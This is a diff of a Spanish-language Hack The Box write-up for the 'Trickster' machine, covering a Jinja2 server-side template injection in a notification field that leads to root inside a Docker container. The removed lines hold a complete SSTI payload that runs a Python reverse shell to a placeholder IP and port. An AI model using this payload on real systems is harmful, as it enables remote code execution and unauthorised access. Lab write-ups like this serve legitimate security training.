@@ -395,11 +395,6 @@ Descargamos la copia de seguridad pulsando en el apartado *BACKUP*, con la idea 
 ![](../assets/img/trickster-hackthebox-writeup/7.png)
 
 En el exploit de Python anterior, vimos la existencia de una flag llamada "*--notification*", identificamos en el pie del campo "*Notification Body*" que usa **Jinja2**, esto nos permite ejecutar ataques de tipo *SSTI* (*Server-Side Template Injection*), reutilizamos el payload del exploit, nos ponemos en escucha por el puerto 443 y pulsamos en "*Send test notification*":
-```python
-
-{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"<IP>\",<PORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'").read() }}{% endif %}{% endfor %}
-```
-
 ![](../assets/img/trickster-hackthebox-writeup/8.png)
 
 Conseguimos acceso como *root* al **docker**, 
